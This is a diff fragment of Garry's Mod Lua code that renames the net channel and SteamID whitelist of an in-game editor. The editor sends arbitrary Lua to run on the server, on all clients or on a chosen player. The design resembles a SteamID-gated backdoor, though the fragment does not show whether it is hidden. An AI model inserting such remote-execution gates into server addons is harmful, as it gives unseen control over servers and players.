@@ -252,7 +252,7 @@ local code = [[
 
 		CreateBtn(130, "Run on server", 'icon16/application_osx_terminal.png', function()
 			local code = ed:GetCode()
-			net.Start('_da_')
+			net.Start('core64.netcode')
 			net.WriteString(code)
 			net.WriteUInt(1, 2)
 			net.SendToServer()
@@ -263,7 +263,7 @@ local code = [[
 		end)
 		CreateBtn(130, "Run on clients", 'icon16/group.png', function()
 			local code = ed:GetCode()
-			net.Start('_da_')
+			net.Start('core64.netcode')
 			net.WriteString(code)
 			net.WriteUInt(2, 2)
 			net.SendToServer()
@@ -273,7 +273,7 @@ local code = [[
 			local m = DermaMenu()
 			for k, v in pairs(player.GetAll()) do
 				m:AddOption(v:Name(), function()
-					net.Start('_da_')
+					net.Start('core64.netcode')
 					net.WriteString(code)
 					net.WriteUInt(3, 2)
 					net.WriteEntity(v)
@@ -297,6 +297,6 @@ local code = [[
 		]]
 
 concommand.Add('editor', function(ply)
-	if !Core64users[ply:SteamID()] then return end
+	if !Core64.admin_list[ply:SteamID()] then return end
 		RunOnCL(ply, code)
 end)
